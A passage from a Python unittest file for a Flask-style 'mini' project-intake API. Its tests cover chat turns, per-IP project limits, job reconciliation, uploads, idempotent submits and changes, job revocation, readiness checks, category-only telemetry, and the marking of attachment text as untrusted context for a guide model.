            self.assertEqual(deleted.status_code, 200)

        replacement = self.create_intake(ip=ip)
        reply = self.client.post(
            f"/api/mini/intakes/{replacement['intake']['id']}/chat",
            json={"text": "Help me plan the booking flow before I build anything."},
            headers=self.claim_headers(replacement),
        )
        self.assertEqual(reply.status_code, 200)
        reply.data

    def test_planning_chat_stays_available_past_the_old_turn_and_intake_limits(self):
        self.client = self.make_client(free_project_limit=1)
        ip = "203.0.113.145"
        created = self.create_intake(ip=ip)
        headers = self.claim_headers(created)
        for turn in range(9):
            response = self.client.post(
                f"/api/mini/intakes/{created['intake']['id']}/chat",
                json={"text": f"Help me refine booking problem detail number {turn}."},
                headers=headers,
            )
            self.assertEqual(response.status_code, 200)
            response.data
        replacement = self.create_intake(ip=ip)
        continued = self.client.post(
            f"/api/mini/intakes/{replacement['intake']['id']}/chat",
            json={"text": "Help me spec a different idea without starting a build."},
            headers=self.claim_headers(replacement),
        )
        self.assertEqual(continued.status_code, 200)
        continued.data
        self.assertEqual(len(self.guide_turns), 10)

    def test_submit_enforces_one_project_but_keeps_the_limited_intake_chat_open(self):
        self.client = self.make_client(free_project_limit=1)
        ip = "203.0.113.147"
        first = self.create_intake(
            ip=ip,
            conversation=[{"role": "user", "text": "Plan a customer booking helper."}],
        )
        first_submit = self.client.post(
            f"/api/mini/intakes/{first['intake']['id']}/submit",
            json={},
            headers=self.claim_headers(first),
        )
        self.assertEqual(first_submit.status_code, 202)

        second = self.create_intake(ip=ip)
        second_headers = self.claim_headers(second)
        before_build = self.client.post(
            f"/api/mini/intakes/{second['intake']['id']}/chat",
            json={"text": "Help me plan an inventory dashboard before I build it."},
            headers=second_headers,
        )
        self.assertEqual(before_build.status_code, 200)
        before_build.data

        limited = self.client.post(
            f"/api/mini/intakes/{second['intake']['id']}/submit",
            json={},
            headers=second_headers,
        )
        self.assertEqual(limited.status_code, 402)
        self.assertEqual(limited.get_json()["code"], "project_limit_reached")

        after_limit = self.client.post(
            f"/api/mini/intakes/{second['intake']['id']}/chat",
            json={"text": "Keep refining it with low-stock alerts and weekly summaries."},
            headers=second_headers,
        )
        self.assertEqual(after_limit.status_code, 200)
        after_limit.data
        reopened = self.client.get(
            f"/api/mini/intakes/{second['intake']['id']}", headers=second_headers
        ).get_json()["intake"]
        self.assertEqual(reopened["status"], "draft")

    def test_active_project_limit_is_applied_only_to_builds_and_released_after_expiry(self):
        self.client = self.make_client(free_project_limit=1)
        ip = "203.0.113.146"
        first = self.create_job(ip=ip)
        self.assertEqual(first.status_code, 202)
        limited = self.create_job(ip=ip)
        self.assertEqual(limited.status_code, 402)
        self.assertEqual(limited.get_json()["code"], "project_limit_reached")
        jobs_path = self.data_root / "mini" / "jobs.json"
        jobs = json.loads(jobs_path.read_text(encoding="utf-8"))
        jobs[first.get_json()["job"]["id"]]["expires_at"] = 1
        jobs_path.write_text(json.dumps(jobs), encoding="utf-8")
        self.blueprint.mini_sweep_once()
        self.assertEqual(json.loads(jobs_path.read_text(encoding="utf-8")), {})

        replacement = self.create_job(ip=ip)
        self.assertEqual(replacement.status_code, 202)
        self.assertEqual(len(self.runs), 2)

    def test_customer_get_reads_persisted_status_until_due_reconciler_runs(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        self.write_v2_result(job_id)

        before = self.client.get(
            f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created)
        )
        self.assertEqual(before.status_code, 200)
        self.assertEqual(before.get_json()["job"]["stage"], "working")
        self.assertFalse((self.project_root / job_id).exists())

        self.blueprint.mini_reconcile_once()
        self.assertEqual(self.stored_job(job_id)["stage"], "ready")
        self.assertTrue((self.project_root / job_id).is_dir())

    def test_reconciler_skips_a_job_until_its_persisted_due_time(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        self.write_v2_result(job_id)
        jobs_path = self.data_root / "mini" / "jobs.json"
        jobs = json.loads(jobs_path.read_text(encoding="utf-8"))
        jobs[job_id]["next_reconcile_at"] = 9_999_999_999
        jobs_path.write_text(json.dumps(jobs), encoding="utf-8")

        self.blueprint.mini_reconcile_once()
        self.assertEqual(self.stored_job(job_id)["stage"], "working")

        jobs = json.loads(jobs_path.read_text(encoding="utf-8"))
        jobs[job_id]["next_reconcile_at"] = 0
        jobs_path.write_text(json.dumps(jobs), encoding="utf-8")
        self.blueprint.mini_reconcile_once()
        self.assertEqual(self.stored_job(job_id)["stage"], "ready")

    def test_upload_reserves_once_for_the_whole_stream_not_once_per_chunk(self):
        created = self.create_intake()
        payload = self.pdf_bytes(b"C" * 240_000)
        with patch.object(
            MiniFrankStorageFence,
            "_usage_locked",
            autospec=True,
            wraps=MiniFrankStorageFence._usage_locked,
        ) as usage:
            response = self.client.post(
                f"/api/mini/intakes/{created['intake']['id']}/attachments",
                data={"files": (io.BytesIO(payload), "large.pdf", "application/pdf")},
                headers=self.claim_headers(created),
                content_type="multipart/form-data",
            )
        self.assertEqual(response.status_code, 201)
        self.assertLess(usage.call_count, 10)

    def test_invalid_claim_is_rejected_before_multipart_form_parsing(self):
        created = self.create_intake()
        with patch(
            "werkzeug.wrappers.request.Request._load_form_data",
            side_effect=AssertionError("multipart parsed before claim validation"),
        ):
            response = self.client.post(
                f"/api/mini/intakes/{created['intake']['id']}/attachments",
                data={"files": (io.BytesIO(b"private"), "notes.txt", "text/plain")},
                content_type="multipart/form-data",
            )
        self.assertEqual(response.status_code, 404)

    def test_dispatch_failure_is_categorized_without_claiming_capacity(self):
        self.fail_next_run = True
        created = self.create_job().get_json()
        stored = self.stored_job(created["job"]["id"])
        self.assertEqual(stored["dispatch_error"], "dispatch_unavailable")
        self.assertNotEqual(stored["dispatch_error"], "waiting_for_capacity")
        self.assertEqual(stored["next_reconcile_at"] > 0, True)

    def test_change_idempotency_replays_without_a_second_revision_or_run(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        self.write_v2_result(job_id)
        self.blueprint.mini_reconcile_once()
        headers = {**self.claim_headers(created), "Idempotency-Key": "change-001"}
        first = self.client.post(
            f"/api/mini/jobs/{job_id}/changes",
            json={"change": "Add evening appointment choices."},
            headers=headers,
        )
        second = self.client.post(
            f"/api/mini/jobs/{job_id}/changes",
            json={"change": "Add evening appointment choices."},
            headers=headers,
        )
        self.assertEqual(first.status_code, 202)
        self.assertEqual(second.status_code, 202)
        self.assertEqual(first.get_json()["job"]["revision"], 2)
        self.assertEqual(second.get_json()["job"]["revision"], 2)
        self.assertEqual(len(self.runs), 2)

        conflict = self.client.post(
            f"/api/mini/jobs/{job_id}/changes",
            json={"change": "Replace the entire booking flow."},
            headers=headers,
        )
        self.assertEqual(conflict.status_code, 409)

    def test_submit_idempotency_replays_the_linked_job(self):
        created = self.create_intake()
        intake_id = created["intake"]["id"]
        headers = {**self.claim_headers(created), "Idempotency-Key": "submit-001"}
        body = {"conversation": [{"role": "user", "text": "I need a simple booking helper for customers."}]}
        first = self.client.post(
            f"/api/mini/intakes/{intake_id}/submit", json=body, headers=headers
        )
        second = self.client.post(
            f"/api/mini/intakes/{intake_id}/submit", json=body, headers=headers
        )
        self.assertEqual(first.status_code, 202)
        self.assertEqual(second.status_code, 202)
        self.assertEqual(first.get_json()["job"]["id"], second.get_json()["job"]["id"])
        self.reconcile_job(first.get_json()["job"]["id"])
        self.assertEqual(len(self.runs), 1)

    def test_claimed_feedback_is_categorical_and_repeatable(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        response = self.client.post(
            f"/api/mini/jobs/{job_id}/feedback",
            json={"rating": "not_yet", "reason": "missing_piece"},
            headers=self.claim_headers(created),
        )
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.get_json()["job"]["feedback"]["status"], "not_yet")
        invalid = self.client.post(
            f"/api/mini/jobs/{job_id}/feedback",
            json={"status": "useful", "reason": "free-form customer transcript"},
            headers=self.claim_headers(created),
        )
        self.assertEqual(invalid.status_code, 400)

    def test_claimed_job_revoke_withdraws_access_and_reuses_fail_closed_cleanup(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        response = self.client.delete(
            f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created)
        )
        self.assertEqual(response.status_code, 200)
        self.assertEqual(
            json.loads((self.data_root / "mini" / "jobs.json").read_text(encoding="utf-8")),
            {},
        )
        self.assertEqual(
            self.client.get(
                f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created)
            ).status_code,
            404,
        )

    def test_revoke_route_and_replayed_delete_are_idempotent(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        revoked = self.client.post(
            f"/api/mini/jobs/{job_id}/revoke", headers=self.claim_headers(created)
        )
        self.assertEqual(revoked.status_code, 200)
        replay = self.client.delete(
            f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created)
        )
        self.assertEqual(replay.status_code, 200)
        self.assertEqual(replay.get_json()["deleted"], job_id)

    def test_readiness_reports_local_signals_without_upstream_status_polling(self):
        response = self.client.get("/api/mini/readiness")
        self.assertEqual(response.status_code, 200)
        payload = response.get_json()
        self.assertTrue(payload["ready"])
        self.assertTrue(payload["reconciler"]["due_based"])
        self.assertEqual(payload["reconciler"]["status_owner"], "background_reconciler")

    def test_telemetry_is_bounded_and_contains_only_categories(self):
        created = self.create_job().get_json()
        self.client.post(
            f"/api/mini/jobs/{created['job']['id']}/feedback",
            json={"status": "useful", "reason": "other"},
            headers=self.claim_headers(created),
        )
        snapshot = self.blueprint.mini_telemetry.snapshot()
        encoded = json.dumps(snapshot)
        self.assertIn("job.feedback", encoded)
        self.assertNotIn(created["claim_token"], encoded)
        self.assertNotIn("I need customers to book appointments", encoded)
        self.assertTrue(all(set(event) <= {"event", "outcome", "created_at"} for event in snapshot["events"]))

    def test_guide_reuses_sanitized_attachment_context_without_reparsing_or_resending(self):
        created = self.create_intake()
        intake_id = created["intake"]["id"]
        headers = self.claim_headers(created)
        uploaded = self.client.post(
            f"/api/mini/intakes/{intake_id}/attachments",
            data={"files": (io.BytesIO(b"booking notes and customer context"), "notes.txt", "text/plain")},
            headers=headers,
            content_type="multipart/form-data",
        )
        self.assertEqual(uploaded.status_code, 201)
        original = __import__("mini_frank")._attachment_excerpt
        with patch("mini_frank._attachment_excerpt", wraps=original) as excerpt:
            first = self.client.post(
                f"/api/mini/intakes/{intake_id}/chat",
                json={"text": "Help me understand these notes."}, headers=headers,
            )
            first.data
            second = self.client.post(
                f"/api/mini/intakes/{intake_id}/chat",
                json={"text": "What should I do next?"}, headers=headers,
            )
            second.data
        self.assertEqual(first.status_code, 200)
        self.assertEqual(second.status_code, 200)
        self.assertEqual(excerpt.call_count, 1)
        self.assertIn(b"UNTRUSTED ATTACHMENT CONTEXT", self.guide_turns[0]["payload"]["message"][0]["text"].encode())
        self.assertNotIn(b"UNTRUSTED ATTACHMENT CONTEXT", self.guide_turns[1]["payload"]["message"].encode())


if __name__ == "__main__":
    unittest.main()
